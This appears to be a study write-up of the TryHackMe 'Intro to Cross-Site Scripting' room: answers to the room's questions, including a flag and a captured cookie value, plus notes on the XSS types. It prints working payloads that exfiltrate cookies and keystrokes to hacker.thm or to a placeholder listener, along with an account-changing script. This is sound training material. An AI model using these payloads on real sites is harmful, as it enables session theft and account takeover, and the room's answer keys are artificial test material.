# Intro to Cross-Site Scripting — TryHackMe

**Platform:** TryHackMe  
**Type:** Room  
**Difficulty:** Easy  
**Name:** Intro to Cross-Site Scripting

---

## Questions & Answers (TryHackMe)

### Basics

Q: What does XSS stand for?  
A: Cross-Site Scripting

---

### XSS Payloads

Q: Which document property could contain the user's session token?  
A: document.cookie

Q: Which JavaScript method is often used as a Proof Of Concept?  
A: alert

---

### Reflected XSS

Q: Where in a URL is a good place to test for reflected XSS?  
A: parameters

---

### Stored XSS

Q: How are stored XSS payloads usually stored on a website?  
A: Database

---

### DOM-Based XSS

Q: What unsafe JavaScript method is good to look for in source code?  
A: eval()

---

### Blind XSS

Q: What tool can you use to test for Blind XSS?  
A: XSS Hunter Express

Q: What type of XSS is very similar to Blind XSS?  
A: Stored XSS

---

### Perfecting your payload

Q: What is the flag you received from level six?  
A: THM{XSS_MASTER}

---

### Practical Example (Blind XSS)

Q: What is the value of the staff-session cookie?  
A: 4AB305E55955197693F01D6F8FD2D321  

Explanation:
- Set up a netcat listener  
- Create a support ticket with this payload:

</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie));</script>

- Replace URL_OR_IP and PORT_NUMBER  
- Send the ticket  
- Receive a base64 encoded cookie in netcat  
- Decode it to retrieve the flag  

---

## Notes

### XSS Overview

- XSS is an injection attack.
- Malicious JavaScript is injected into a web application.
- The goal is to execute code in another user's browser.

---

### XSS Payloads

- Payload = JavaScript code executed on the target.
- Two parts:
  - Intention → what the code does
  - Modification → how to make it execute

Examples:

Proof of Concept:
<script>alert('XSS');</script>

Session Stealing:
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

Keylogger:
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>

Business Logic:
<script>user.changeEmail('attacker@hacker.thm');</script>

---

### Reflected XSS

- User input is reflected in the response without validation.
- Payload is not stored.

Testing:
- URL parameters
- URL path
- Sometimes headers

---

### Stored XSS

- Payload is stored in the application (e.g. database).
- Executes when other users load the page.

Examples:
- Blog comments
- User profiles
- Listings

Impact:
- Steal cookies
- Redirect users
- Execute actions

---

### DOM-Based XSS

- Happens entirely in the browser.
- No backend involvement.

- Occurs when JavaScript processes user-controlled input.

Look for:
- window.location
- URL fragments (#)

- Dangerous function:
  - eval()

Example:
https://example.com/page.html#<script>alert('XSS')</script>

---

### Blind XSS

- Payload is stored but attacker cannot see execution.
- Requires a callback to detect execution.

Testing:
- Use external request

Tool:
- XSS Hunter Express
